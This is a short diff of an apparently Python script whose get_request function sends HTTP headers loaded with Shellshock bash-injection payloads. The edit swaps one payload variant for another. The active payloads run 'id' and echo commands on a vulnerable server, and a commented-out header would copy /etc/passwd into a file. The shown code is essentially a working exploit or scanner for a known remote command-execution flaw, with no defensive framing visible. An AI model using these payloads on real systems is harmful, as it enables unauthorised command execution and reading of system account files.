@@ -9,7 +9,8 @@ def get_request(url):
                  "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
                  "CustomHeader": "() { test;};echo; echo; echo shellshock one;",    
                  #"CustomHeaderNew": "() { _;} >_[$($())] { echo oh my lady gaga; id;}", 
-                 "CustomHeaderNew": "() { _;} >shellshockme[$($($()))] { echo oh my lady gaga; id; echo go jimmy;}",                       
+                 #"CustomHeaderNew": "() { _;} >shellshockme[$($($()))] { echo oh my lady gaga; id; echo go jimmy;}",                       
+                 "CustomHeaderNew": "() { _;} >shellshockme[$($())] { id; echo go jimmy;}",                       
                  #"CustomHeader2": "() { :; }; /bin/cat /etc/passwd > ./shellshock2.txt",   
                  #"CustomHeader2_1": "() { (a)=>\ echo; echo; echo date"             
                  }
